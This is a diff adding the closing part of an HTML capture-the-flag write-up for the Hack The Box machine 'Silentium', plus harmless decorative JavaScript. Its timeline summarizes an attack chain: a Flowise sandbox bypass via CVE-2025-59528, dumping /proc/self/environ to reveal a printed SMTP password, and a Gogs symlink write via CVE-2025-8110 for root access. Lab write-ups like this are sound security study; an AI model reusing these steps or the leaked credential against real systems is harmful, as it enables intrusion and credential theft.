+          <tr><td class="mon">17:00–18:57</td><td>MCP/stdio experiments (timeout), wrong plural route — all failed</td></tr>
+          <tr><td class="mon">18:57</td><td>Authenticated to Flowise as ben@silentium.htb</td></tr>
+          <tr><td class="mon">19:07</td><td>CVE-2025-59528 confirmed via singular route</td></tr>
+          <tr><td class="mon">19:17–19:34</td><td>NodeVM sandbox analysis; TypeORM/child_process dead ends</td></tr>
+          <tr><td class="mon">19:47</td><td>LangChain TextLoader bypass discovered</td></tr>
+          <tr><td class="mon">19:48</td><td>/proc/self/environ dumped → SMTP_PASSWORD=r04D!!_R4ge</td></tr>
+          <tr><td class="mon">19:48</td><td>SSH as ben → <b>user flag</b></td></tr>
+          <tr><td class="mon">19:48–19:52</td><td>Host enum — Gogs running as root on :3001</td></tr>
+          <tr><td class="mon">20:10</td><td>Captcha solved (499699), hacker user registered in Gogs</td></tr>
+          <tr><td class="mon">20:12</td><td>Symlink committed, CVE-2025-8110 PutContents write</td></tr>
+          <tr><td class="mon">20:12</td><td>SSH as root → <b>root flag</b></td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p style="font-family:var(--mono);font-size:13px;color:var(--muted)">Total time: ~5 hours (automated + manual with nino-harness)</p>
+  </section>
+
+  <footer>
+    <p>Authorized lab work only — Silentium is a Hack The Box machine on a sanctioned network.<br>
+    CVE-2025-59528 (Flowise) · CVE-2025-8110 (Gogs). Charted by ssephi.
+    <br><a href="../">← All machines</a></p>
+  </footer>
+</div>
+
+<script>
+(function map(){
+  const c=document.getElementById("map"),x=c.getContext("2d");let W,H;
+  function line(v){return getComputedStyle(document.documentElement).getPropertyValue(v).trim();}
+  function size(){W=c.width=innerWidth*devicePixelRatio;H=c.height=innerHeight*devicePixelRatio;draw();}
+  function draw(){
+    x.clearRect(0,0,W,H);const dpr=devicePixelRatio;
+    x.strokeStyle=line('--map-2');x.lineWidth=1*dpr;
+    for(let gx=0;gx<W;gx+=150*dpr){x.beginPath();x.moveTo(gx,0);x.lineTo(gx,H);x.stroke();}
+    for(let gy=0;gy<H;gy+=150*dpr){x.beginPath();x.moveTo(0,gy);x.lineTo(W,gy);x.stroke();}
+    x.strokeStyle=line('--map');x.lineWidth=1.15*dpr;
+    const rings=(cx,cy,rot,n)=>{for(let i=0;i<n;i++){x.globalAlpha=0.9-i*0.05;
+      x.beginPath();x.ellipse(cx,cy,(50+i*46)*dpr,(34+i*32)*dpr,rot,0,7);x.stroke();}};
+    rings(W*0.80,H*0.20,-0.5,9);
+    rings(W*0.14,H*0.86,0.35,7);
+    x.globalAlpha=1;
+  }
+  addEventListener("resize",size);size();
+})();
+
+(function morph(){
+  const GLITCH="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%&*!?<>{}[]=/\\|~^`";
+  const MODES={brand:{maxActive:2,resolveSpeed:0.04,mutateChance:0.008},
+               title:{maxActive:4,resolveSpeed:0.06,mutateChance:0.015},
+               hero:{maxActive:8,resolveSpeed:0.08,mutateChance:0.025}};
+  const g=()=>GLITCH[Math.floor(Math.random()*GLITCH.length)];
+  const skip=ch=>ch===" "||ch==="."||ch.charCodeAt(0)>127;
+  const units=[];
+  document.querySelectorAll("[data-morph]").forEach(el=>{
+    const cfg=MODES[el.dataset.morph]||MODES.title;
+    const chars=[...el.textContent].map(ch=>{const s=document.createElement("span");
+      s.textContent=ch;s.style.display="inline-block";if(ch===" ")s.style.minWidth="0.28em";
+      return{original:ch,el:s,prog:0,dir:"resolving"};});
+    el.textContent="";chars.forEach(c=>el.appendChild(c.el));units.push({cfg,chars});
+  });
+  if(!units.length||matchMedia("(prefers-reduced-motion:reduce)").matches)return;
+  let last=0;const INT=50;
+  function paint(c){const p=c.prog,e=c.el;
+    if(p>0){e.style.color=`rgba(109,40,217,${0.55+p*0.45})`;
+      e.style.textShadow=p>0.5?`0 0 ${3+p*5}px rgba(109,40,217,${p*0.28})`:"";
+      e.style.transform=`translateY(${(Math.random()-0.5)*p*1.4}px)`;}
+    else{e.style.color="";e.style.textShadow="";e.style.transform="";e.style.transition="color 200ms ease";}}
+  function frame(now){requestAnimationFrame(frame);if(now-last<INT)return;last=now;
+    units.forEach(u=>{let active=u.chars.filter(c=>c.prog>0).length;
+      u.chars.forEach(c=>{if(skip(c.original))return;
+        if(c.dir==="glitching"){c.prog=Math.min(1,c.prog+0.15+Math.random()*0.1);
+          if(c.prog>=1)c.dir="resolving";c.el.textContent=g();}
+        else if(c.prog>0){c.prog=Math.max(0,c.prog-u.cfg.resolveSpeed-Math.random()*0.02);
+          if(c.prog<=0){c.el.textContent=c.original;c.prog=0;}
+          else c.el.textContent=Math.random()<c.prog?g():c.original;}
+        if(c.prog===0&&active<u.cfg.maxActive&&Math.random()<u.cfg.mutateChance){
+          c.dir="glitching";c.prog=0.05;c.el.textContent=g();active++;}
+        paint(c);});});}
+  requestAnimationFrame(frame);
+})();
+</script>
+</body>
+</html>
